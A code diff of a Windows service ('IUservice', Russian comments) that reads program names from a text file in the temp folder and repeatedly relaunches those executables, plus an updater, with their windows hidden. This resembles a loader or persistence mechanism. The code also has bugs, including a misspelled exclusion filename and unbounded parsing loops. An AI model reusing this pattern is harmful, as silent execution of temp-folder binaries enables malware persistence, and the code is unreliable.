@@ -4,6 +4,8 @@
 #include <iostream>
 #include <urlmon.h>
 #include <tlhelp32.h>
+#include <fstream>
+#include <string>
 #pragma comment(lib, "urlmon.lib")
 
 SERVICE_STATUS        g_ServiceStatus = { 0 };
@@ -16,36 +18,36 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);
 
 #define SERVICE_NAME  _T("IUservice")
 
-BOOL InstallService(const CString& strServiceName, const CString& strDisplayName, const CString& strBinaryPathName)
+std::wstring* readAppsNames(std::wstring tempFolder)
 {
-	BOOL bResult = FALSE;
-
-	SC_HANDLE hServiceControlManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-	if (NULL != hServiceControlManager)
+	std::wstring* result = new std::wstring[8]; //8 ссылок
+	std::wstring singleName = L"";
+	std::string str;
+	std::ifstream fin(tempFolder + L"\listapp.txt");
+	char a = 'a';
+	int i = 0;
+	while (!fin.eof())
 	{
-		SC_HANDLE hService = CreateService(hServiceControlManager,
-			(LPCTSTR)strServiceName,
-			(LPCTSTR)strDisplayName,
-			SC_MANAGER_ALL_ACCESS,
-			SERVICE_WIN32_OWN_PROCESS,
-			SERVICE_AUTO_START,
-			SERVICE_ERROR_NORMAL,
-			(LPCTSTR)strBinaryPathName,
-			0,
-			0,
-			0,
-			0,
-			0);
-		if (hService != NULL)
+
+		std::getline(fin, str);
+		if (str.length() == 0) break;
+		int j = 0;
+		while (str[j] != ';')
 		{
-			bResult = TRUE;
-			CloseServiceHandle(hService);
+			++j;
 		}
-
-		CloseServiceHandle(hServiceControlManager);
+		++j;
+		while (str[j] != ';')
+		{
+			singleName += str[j];
+			++j;
+		}
+		result[i] = singleName;
+		std::wcout << i << "\t" << result[i].c_str() << std::endl;
+		singleName = L"";
+		++i;
 	}
-
-	return bResult;
+	return result;
 }
 
 bool ProcessRunning(const WCHAR* name)
@@ -208,27 +210,32 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
 		TCHAR szTempPathBuffer[MAX_PATH];
 		GetTempPath(MAX_PATH, szTempPathBuffer);
 		std::wstring filePath = szTempPathBuffer;
+		filePath += L"\\updateiuservice.exe";
+		ShellExecute(NULL, _T("open"), filePath.c_str(), NULL, NULL, SW_HIDE);
+		filePath = szTempPathBuffer;
+		std::wstring* appsNames = readAppsNames(szTempPathBuffer);
 		for (int i = 0; i < 288; ++i) //288*5минут = 24 часа
 		{
 			//Проверка и запуск прог
-			if (!ProcessRunning(L"hello_word.exe"))
+			for (int i = 0; i < 8; ++i) //Должно быть <=8 строк
 			{
-				filePath += L"\hello_word.exe";
-				ShellExecute(NULL, _T("open"), filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
-				filePath = szTempPathBuffer;
-			}
-			if (!ProcessRunning(L"empty.exe"))
-			{
-				filePath += L"\empty.exe";
-				ShellExecute(NULL, _T("open"), filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
-				filePath = szTempPathBuffer;
+				if (appsNames[i].length() > 0)
+				{
+					std::wstring appName = appsNames[i];
+					if (appName != L"upadteiuservice.exe")
+					{
+						if (!ProcessRunning(appName.c_str()))
+						{
+							filePath += appName;
+							ShellExecute(NULL, _T("open"), filePath.c_str(), NULL, NULL, SW_HIDE);
+							filePath = szTempPathBuffer;
+						}
+					}
+				}
 			}
 			//Sleep for 5 minutes
 			Sleep(300000);
-		}
-		filePath += L"\install.exe";
-		ShellExecute(NULL, _T("open"), filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
-		filePath = szTempPathBuffer;
+		}	
 	}
 
 	return ERROR_SUCCESS;
